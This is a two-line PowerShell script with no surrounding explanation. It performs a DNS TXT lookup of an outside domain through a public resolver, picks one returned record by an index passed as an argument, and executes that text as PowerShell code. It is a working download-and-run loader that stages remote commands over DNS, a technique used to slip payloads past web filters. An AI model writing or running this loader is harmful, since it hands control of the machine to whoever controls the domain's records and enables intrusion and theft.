$param=$args[0]
powershell .((nslookup -q=txt reyes-holdings.uk 8.8.8.8)[-$param])